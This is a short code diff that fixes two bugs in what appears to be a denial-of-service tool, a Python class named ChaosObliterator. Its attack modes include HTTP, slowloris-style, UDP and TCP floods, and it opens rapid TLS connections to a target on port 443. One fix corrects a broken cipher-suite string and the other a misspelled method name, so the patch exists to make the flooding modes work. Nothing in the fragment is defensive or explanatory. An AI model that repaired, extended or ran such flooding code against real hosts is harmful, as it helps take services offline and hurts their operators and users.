@@ -190,7 +190,7 @@ class ChaosObliterator:
                 sock.settimeout(0.08)
                 sock.connect((self.target_l7, 443))
                 ciphers = random.choice([
-                    "TLS_AES_128_GCM_SHA256:ECDHE-R-ASAES128-SHA256",
+                    "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-SHA256",
                     "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384",
                     "TLS_AES_256_GCM_SHA384:ECDHE-RSA-CHACHA20-POLY1305",
                     "TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
@@ -265,7 +265,7 @@ class ChaosObliterator:
             "chaoshttp": self._chaoshttp,
             "ghostloris": self._ghostloris,
             "udpchaos": self._udpchaos,
-            "tcpobliterator": self._tcpoblimator
+            "tcpobliterator": self._tcpobliterator
         }
         for method in self.methods:
             if method in method_funcs:
